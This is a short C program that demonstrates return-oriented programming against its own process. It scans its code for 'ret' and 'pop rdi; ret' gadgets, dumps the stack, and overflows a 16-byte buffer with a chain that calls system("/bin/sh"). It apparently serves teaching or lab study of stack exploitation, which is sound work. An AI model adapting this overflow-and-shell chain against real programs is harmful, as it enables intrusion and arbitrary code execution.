#include <stdio.h>
#include <stdlib.h>

int i;
void *rop_ret, *rop_pop_rdi;
void **rop_chain;

long gadget_ret() { return 0xc3; }
long gadget_pop_rdi() { return 0xc35f; }

int main() {
  char buf[0x10];

  /* Find ROP gadgets */
  for (rop_ret = gadget_ret; ; rop_ret++) {
    if (*(unsigned char*)(rop_ret) == 0xc3) {
      printf("[+] Found 'ret;' at %p\n", rop_ret);
      break;
    }
  }

  for (rop_pop_rdi = gadget_pop_rdi; ; rop_pop_rdi++) {
    if (*(unsigned char*)(rop_pop_rdi) == 0x5f
        && *(unsigned char*)(rop_pop_rdi+1) == 0xc3) {
      printf("[+] Found 'pop rdi; ret;' at %p\n", rop_pop_rdi);
      break;
    }
  }

  /* Dumps stack for debug */
  puts("--- Stack Dump ---");
  for (i = 0; i < 0x80; i += 8) {
    printf("%p: 0x%016lx\n", buf + i, *(unsigned long*)(buf + i));
  }

  /* Inject ROP chain */
  puts("[+] Injecting ROP chain...");
  rop_chain = (void*)buf;
  for (i = 0; i < 0x8; i++) {
    *rop_chain++ = rop_ret;
  }
  *rop_chain++ = rop_pop_rdi;
  *rop_chain++ = "/bin/sh";
  *rop_chain++ = system;
  *rop_chain++ = rop_pop_rdi;
  *rop_chain++ = (void*)0;
  *rop_chain++ = exit;

  /* Dumps stack for debug */
  puts("--- Stack Dump ---");
  for (int i = 0; i < 0x80; i += 8) {
    printf("%p: 0x%016lx\n", buf + i, *(unsigned long*)(buf + i));
  }

  return 0;
}
